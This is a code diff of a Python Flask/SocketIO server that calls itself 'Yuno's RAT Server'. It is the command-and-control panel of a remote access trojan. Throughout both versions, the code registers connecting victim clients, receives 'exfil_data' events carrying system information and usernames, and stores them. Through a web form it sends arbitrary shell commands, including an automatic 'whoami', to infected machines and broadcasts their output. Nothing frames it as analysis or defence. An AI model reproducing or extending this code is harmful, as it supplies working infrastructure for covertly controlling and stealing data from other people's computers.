@@ -1,126 +1,144 @@
 #!/usr/bin/env python3
 import os
 import json
-from datetime import datetime
-from flask import Flask, render_template, request, jsonify, url_for
+import datetime
+from flask import Flask, render_template, request, send_from_directory
 from flask_socketio import SocketIO, emit
-import threading
+from werkzeug.utils import secure_filename
 
-
-# Server settings
-HOST = "0.0.0.0"
-DATA_DIR = "rat_data"
-
-# Ensure data directory exists
-if not os.path.exists(DATA_DIR):
-    os.makedirs(DATA_DIR)
-
-# Store connected clients (client_id -> socket session ID)
-clients = {}
-clients_lock = threading.Lock()
-
-# Store command outputs (client_id -> list of {command, output, timestamp})
-command_outputs = {}
-outputs_lock = threading.Lock()
-
-# Flask app and SocketIO
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret!'  # Needed for SocketIO
+app.config['SECRET_KEY'] = 'secret!'
+app.config['UPLOAD_FOLDER'] = 'uploads'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-@socketio.on('connect')
-def handle_connect():
-    client_id = f"client_{request.remote_addr}_{request.sid}"
-    print(f"[*] New client connected: {client_id}")
-    with clients_lock:
-        clients[client_id] = request.sid
-    with outputs_lock:
-        if client_id not in command_outputs:
-            command_outputs[client_id] = []
+# Ensure upload directory exists
+if not os.path.exists(app.config['UPLOAD_FOLDER']):
+    os.makedirs(app.config['UPLOAD_FOLDER'])
 
-@socketio.on('disconnect')
-def handle_disconnect():
-    client_id = f"client_{request.remote_addr}_{request.sid}"
-    print(f"[*] Client disconnected: {client_id}")
-    with clients_lock:
-        if client_id in clients:
-            del clients[client_id]
+# Track connected clients
+connected_clients = set()
 
-@socketio.on('exfil_data')
-def handle_exfil_data(data):
-    client_id = f"client_{request.remote_addr}_{request.sid}"
-    try:
-        client_data = json.loads(data)
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        
-        # Handle different data types
-        if client_data.get("type") == "command_output":
-            # Store command output in memory
-            with outputs_lock:
-                command_outputs[client_id].append({
-                    "command": client_data["command"],
-                    "output": client_data["output"],
-                    "timestamp": timestamp,
-                    "current_dir": client_data.get("current_dir", "Unknown")
-                })
-            # Broadcast to web interface
-            socketio.emit('command_output', {
-                "client_id": client_id,
-                "command": client_data["command"],
-                "output": client_data["output"],
-                "timestamp": timestamp,
-                "current_dir": client_data.get("current_dir", "Unknown")
-            })
-        else:
-            # Save system info to disk
-            filename = f"{DATA_DIR}/{client_id}_{timestamp}.json"
-            with open(filename, 'w') as f:
-                json.dump(client_data, f, indent=2)
-            print(f"[*] Received data from {client_id}: Saved to {filename}")
-    except json.JSONDecodeError:
-        print(f"[!] Invalid data from {client_id}: {data}")
+# Store client info
+client_info = {}
 
-def send_command(client_id, command):
-    with clients_lock:
-        if client_id in clients:
-            try:
-                socketio.emit('command', command, to=clients[client_id])
-                print(f"[*] Sent command to {client_id}: {command}")
-                return True, f"Sent command to {client_id}: {command}"
-            except Exception as e:
-                print(f"[!] Failed to send command to {client_id}: {e}")
-                return False, f"Failed to send command: {e}"
-        else:
-            print(f"[!] Client {client_id} not found")
-            return False, "Client not found"
+def get_files():
+    """List all files in the upload folder."""
+    upload_folder = app.config['UPLOAD_FOLDER']
+    files = [f for f in os.listdir(upload_folder) if os.path.isfile(os.path.join(upload_folder, f))]
+    return sorted(files)
 
-# Flask Routes for Web Interface
 @app.route('/')
 def index():
-    with clients_lock:
-        client_list = list(clients.keys())
-    files = os.listdir(DATA_DIR)
-    return render_template('index.html', clients=client_list, files=files)
+    """Render the main page with connected clients and uploaded files."""
+    files = get_files()
+    return render_template('index.html', clients=list(connected_clients), files=files)
 
 @app.route('/send_command', methods=['POST'])
-def handle_send_command():
+def send_command():
+    """Handle command submission from the web interface."""
     client_id = request.form.get('client_id')
     command = request.form.get('command')
-    if client_id and command:
-        success, message = send_command(client_id, command)
-        return jsonify({"success": success, "message": message})
-    return jsonify({"success": False, "message": "Invalid client ID or command"})
+
+    if not client_id or not command:
+        return {"status": "error", "message": "Missing client_id or command"}, 400
+
+    # Emit command to the specified client
+    socketio.emit('command', command, to=client_id)
+
+    return {"status": "success", "message": f"Command '{command}' sent to {client_id}"}
 
 @app.route('/view_file/<filename>')
 def view_file(filename):
-    filepath = os.path.join(DATA_DIR, filename)
-    if os.path.exists(filepath):
-        with open(filepath, 'r') as f:
-            data = json.load(f)
-        return render_template('view_file.html', filename=filename, data=data)
-    return "File not found", 404
+    """Render a page to view the contents of an uploaded file."""
+    filename = secure_filename(filename)
+    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+    if os.path.exists(file_path):
+        with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
+            content = f.read()
+        return render_template('view_file.html', filename=filename, file_content=content)
+    else:
+        return "File not found", 404
+
+@socketio.on('connect')
+def handle_connect():
+    """Handle new client connections."""
+    client_id = request.sid
+    connected_clients.add(client_id)
+    print(f"[*] Client connected: {client_id}")
+    emit('client_update', list(connected_clients), broadcast=True)
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    """Handle client disconnections."""
+    client_id = request.sid
+    if client_id in connected_clients:
+        connected_clients.remove(client_id)
+        client_info.pop(client_id, None)
+        print(f"[*] Client disconnected: {client_id}")
+        emit('client_update', list(connected_clients), broadcast=True)
+
+@socketio.on('exfil_data')
+def handle_exfil_data(data):
+    """Handle exfiltrated data from clients."""
+    client_id = request.sid
+    data = json.loads(data)
+    data_type = data.get('type')
+
+    if data_type == "system_info":
+        # Store client info
+        username = data.get('system', {}).get('username', None)
+        if not username:
+            # Request username via whoami
+            socketio.emit('command', 'whoami', to=client_id)
+        else:
+            client_info[client_id] = data.get('system', {})
+            client_info[client_id]['username'] = username
+        # Save system info to a file
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"{client_id}_{timestamp}_sysinfo.json"
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        with open(filepath, 'w', encoding='utf-8') as f:
+            json.dump(data, f, indent=4)
+        print(f"[*] Exfiltrated data saved: {filepath}")
+
+    elif data_type == "command_output":
+        command = data.get('command', 'unknown')
+        output = data.get('output', '')
+        current_dir = data.get('current_dir', 'unknown')
+
+        # Check if the command was whoami to update username
+        if command.strip().lower() == 'whoami':
+            username = output.strip()
+            if client_id not in client_info:
+                client_info[client_id] = {}
+            client_info[client_id]['username'] = username
+
+        # Emit command output to web interface
+        emit('command_output', {
+            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'client_id': client_id,
+            'command': command,
+            'output': output,
+            'current_dir': current_dir
+        }, broadcast=True)
+
+    # Emit updated client info to web interface
+    client_info_list = [
+        {'id': cid, 'system': info}
+        for cid, info in client_info.items()
+    ]
+    emit('client_info', client_info_list, broadcast=True)
+
+@socketio.on('request_client_info')
+def handle_request_client_info():
+    """Handle requests for client info from the web interface."""
+    client_info_list = [
+        {'id': cid, 'system': info}
+        for cid, info in client_info.items()
+    ]
+    emit('client_info', client_info_list)
 
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
-    print("A remote access tool by Yuno\n")
-    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
+    print("A remote access server by Yuno\n")
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
